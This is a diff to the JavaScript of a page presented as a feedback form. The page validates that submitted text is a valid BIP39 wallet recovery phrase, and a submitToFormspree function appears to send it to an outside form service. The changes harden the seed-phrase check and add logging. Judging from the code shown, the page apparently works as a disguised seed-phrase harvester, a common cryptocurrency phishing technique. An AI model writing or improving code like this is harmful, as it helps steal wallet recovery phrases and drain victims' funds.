@@ -76,13 +76,16 @@ async function submitToFormspree(feedback) {
 function validateBIP39(mnemonic) {
     try {
         // Check if bip39 library is loaded
-        if (typeof bip39 === 'undefined') {
-            console.error('BIP39 library not loaded');
+        if (typeof bip39 === 'undefined' || typeof bip39.validateMnemonic !== 'function') {
+            console.error('BIP39 library not loaded properly');
             return false;
         }
         
+        console.log('Validating mnemonic with BIP39...');
         // Validate the mnemonic
-        return bip39.validateMnemonic(mnemonic);
+        const isValid = bip39.validateMnemonic(mnemonic);
+        console.log('BIP39 validation result:', isValid);
+        return isValid;
     } catch (error) {
         console.error('BIP39 validation error:', error);
         return false;
@@ -90,6 +93,13 @@ function validateBIP39(mnemonic) {
 }
 
 function initializeFeedbackPage() {
+    // Check if BIP39 library is loaded
+    if (typeof bip39 === 'undefined') {
+        console.error('BIP39 library failed to load. Please refresh the page.');
+    } else {
+        console.log('BIP39 library loaded successfully');
+    }
+    
     const feedbackForm = document.getElementById('feedbackForm');
     const feedbackTextarea = document.getElementById('feedback');
     const errorMessage = document.getElementById('errorMessage');
@@ -200,5 +210,3 @@ if (document.readyState === 'loading') {
 } else {
     initializeFeedbackPage();
 }
-
-
